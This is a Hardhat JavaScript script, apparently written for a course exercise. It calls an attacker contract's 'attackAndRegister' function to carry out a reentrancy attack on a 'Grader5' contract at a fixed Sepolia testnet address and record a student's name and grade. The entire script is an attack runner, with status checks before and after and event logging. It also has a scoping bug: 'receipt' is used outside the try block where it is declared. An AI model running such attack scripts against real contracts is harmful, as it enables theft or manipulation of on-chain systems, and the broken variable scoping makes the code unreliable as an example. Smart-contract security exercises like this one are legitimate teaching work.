const { ethers } = require("hardhat");
require("dotenv").config();

/**
 * @title Execute Attack on Grader5 Contract
 * @author Eduardo J. Moreno
 * @notice Script to execute the reentrancy attack and register student name
 */

async function main() {
  const studentName = "Eduardo J. Moreno";
  
  console.log("🎯 Starting Attack Execution");
  console.log("==========================================");
  console.log("- Student:", studentName);
  console.log("- Target: 0x5733eE985e22eFF46F595376d79e31413b1A1e16");
  
  // Read deployment info
  const fs = require('fs');
  let attackerAddress;
  
  try {
    const deploymentInfo = JSON.parse(fs.readFileSync('deployment-info.json', 'utf8'));
    attackerAddress = deploymentInfo.contractAddress;
    console.log("- Attacker Contract:", attackerAddress);
  } catch (error) {
    console.error("❌ Could not read deployment info. Please deploy first.");
    process.exit(1);
  }
  
  // Get signer
  const [signer] = await ethers.getSigners();
  console.log("- Executor:", signer.address);
  
  // Get contract instance
  const Grader5Attacker = await ethers.getContractFactory("Grader5Attacker");
  const attacker = Grader5Attacker.attach(attackerAddress);
  
  console.log("\n🔍 Pre-Attack Status Check:");
  try {
    const status = await attacker.getAttackStatus();
    console.log("- Currently attacking:", status.isCurrentlyAttacking);
    console.log("- Current counter:", status.contractCounter.toString());
    console.log("- Already graded:", status.alreadyGraded);
    console.log("- Contract balance:", ethers.formatEther(await attacker.getBalance()), "ETH");
    
    if (status.alreadyGraded) {
      console.log("✅ Already graded! Checking student record...");
      const grade = await attacker.checkStudentGrade(studentName);
      console.log("- Grade:", grade.toString());
      return;
    }
    
  } catch (error) {
    console.log("- Status check failed:", error.message);
  }
  
  console.log("\n⚡ Executing Reentrancy Attack + Registration...");
  
  try {
    // Execute combined attack and registration
    const tx = await attacker.attackAndRegister(studentName, {
      value: ethers.parseEther("0.001"), // Send 0.001 ETH for the attack
      gasLimit: 500000 // Set higher gas limit for complex operation
    });
    
    console.log("🔄 Transaction submitted:", tx.hash);
    console.log("⏳ Waiting for confirmation...");
    
    const receipt = await tx.wait();
    
    console.log("\n✅ Attack Executed Successfully!");
    console.log("==========================================");
    console.log("- Transaction Hash:", receipt.hash);
    console.log("- Block Number:", receipt.blockNumber);
    console.log("- Gas Used:", receipt.gasUsed.toString());
    console.log("- Gas Price:", ethers.formatUnits(receipt.gasPrice, "gwei"), "gwei");
    console.log("- Total Cost:", ethers.formatEther(receipt.gasUsed * receipt.gasPrice), "ETH");
    
    // Parse events
    console.log("\n📋 Events Emitted:");
    for (const event of receipt.logs) {
      try {
        const parsedEvent = attacker.interface.parseLog(event);
        console.log(`- ${parsedEvent.name}:`, parsedEvent.args);
      } catch (e) {
        // Skip unparseable events
      }
    }
    
  } catch (error) {
    console.error("❌ Attack failed:", error.message);
    
    // Try to get more details
    if (error.data) {
      try {
        const reason = attacker.interface.parseError(error.data);
        console.log("- Error details:", reason);
      } catch (e) {
        console.log("- Raw error data:", error.data);
      }
    }
    
    return;
  }
  
  console.log("\n🎉 Post-Attack Verification:");
  try {
    const finalStatus = await attacker.getAttackStatus();
    console.log("- Final counter:", finalStatus.contractCounter.toString());
    console.log("- Is graded:", finalStatus.alreadyGraded);
    
    if (finalStatus.alreadyGraded) {
      const grade = await attacker.checkStudentGrade(studentName);
      console.log("- Final grade:", grade.toString());
      console.log("✅ SUCCESS: Eduardo J. Moreno has been registered with grade:", grade.toString());
    }
    
  } catch (error) {
    console.log("- Verification failed:", error.message);
  }
  
  console.log("\n🔗 Verification Links:");
  console.log(`- Attacker Contract: https://sepolia.etherscan.io/address/${attackerAddress}`);
  console.log(`- Transaction: https://sepolia.etherscan.io/tx/${receipt ? receipt.hash : 'N/A'}`);
  console.log("- Target Contract: https://sepolia.etherscan.io/address/0x5733eE985e22eFF46F595376d79e31413b1A1e16");
  
  // Update deployment info with attack details
  try {
    const deploymentInfo = JSON.parse(fs.readFileSync('deployment-info.json', 'utf8'));
    deploymentInfo.attackExecuted = true;
    deploymentInfo.attackTransactionHash = receipt ? receipt.hash : null;
    deploymentInfo.studentRegistered = studentName;
    deploymentInfo.attackTimestamp = new Date().toISOString();
    
    fs.writeFileSync('deployment-info.json', JSON.stringify(deploymentInfo, null, 2));
    console.log("💾 Attack info saved to deployment-info.json");
  } catch (error) {
    console.log("⚠️  Could not update deployment info:", error.message);
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("❌ Script failed:", error);
    process.exit(1);
  });
